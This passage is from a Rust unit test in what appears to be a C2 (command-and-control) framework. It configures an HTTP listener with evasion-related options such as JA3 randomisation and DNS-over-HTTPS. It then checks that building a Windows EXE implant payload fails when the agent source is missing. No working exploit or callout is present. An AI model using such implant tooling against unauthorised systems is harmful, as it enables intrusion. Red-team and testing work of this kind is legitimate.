            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Exe".to_owned(),
            config: "{}".to_owned(),
        };
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: true,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
        }));

        let error = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("missing specter source tree should be rejected");
        assert!(
            matches!(error, PayloadBuildError::ToolchainUnavailable { .. }),
            "expected ToolchainUnavailable, got {error:?}"
        );
        Ok(())
    }
}
